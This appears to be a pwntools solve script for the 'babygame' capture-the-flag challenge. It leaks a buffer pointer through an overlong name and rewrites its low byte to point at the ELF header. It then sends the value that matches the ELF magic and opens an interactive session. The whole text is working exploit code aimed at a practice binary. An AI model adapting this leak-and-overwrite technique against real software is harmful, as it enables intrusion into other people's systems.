from pwn import *

def start(argv=[], *a, **kw):
		if args.GDB:
				context.terminal = ["/mnt/c/wsl_terminal/wsl-terminal/open-wsl.exe", "-e"]
				return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
		elif args.REMOTE:
				return remote('pwn-2021.duc.tf', 31907, *a, **kw)
		else:
				return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b * game+43
b * game+76
continue
'''.format(**locals())

exe = './babygame'
elf = context.binary = ELF(exe, checksec=False)
# warning/info/debug
context.log_level = 'info'

io = start()
offset = b'aaaabaaacaaadaaaeaaafaaagaaahaaa'

# send 32 chars
io.sendlineafter(b' your name?\n', offset)
# leak RANDBUF addr
io.sendlineafter(b'> ', b'2')
io.recvuntil(b'haaa')
randbuf_addr = bytearray(io.recvline()[:-1])
randbuf_addr[0] = 0xa3
print(randbuf_addr)

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b' username to?\n', offset + randbuf_addr)

io.sendlineafter(b'> ', b'1337')
# 1179403647 = 0x464C457F
io.interactive()